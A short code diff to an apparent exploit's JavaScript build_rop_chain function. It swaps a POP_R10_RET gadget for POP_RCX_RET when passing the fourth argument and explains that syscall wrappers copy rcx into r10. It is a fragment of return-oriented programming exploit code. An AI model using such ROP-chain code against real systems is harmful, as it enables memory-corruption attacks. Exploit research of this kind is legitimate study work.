@@ -393,7 +393,9 @@ function build_rop_chain (wrapper_addr, arg1, arg2, arg3, arg4, arg5, arg6) {
     chain.push(arg3)
   }
   if (typeof arg4 !== 'undefined') {
-    chain.push(gadgets.POP_R10_RET)
+    // Use RCX for function wrappers (not R10)
+    // Wrappers do "mov r10, rcx" before syscall
+    chain.push(gadgets.POP_RCX_RET)
     chain.push(arg4)
   }
   if (typeof arg5 !== 'undefined') {
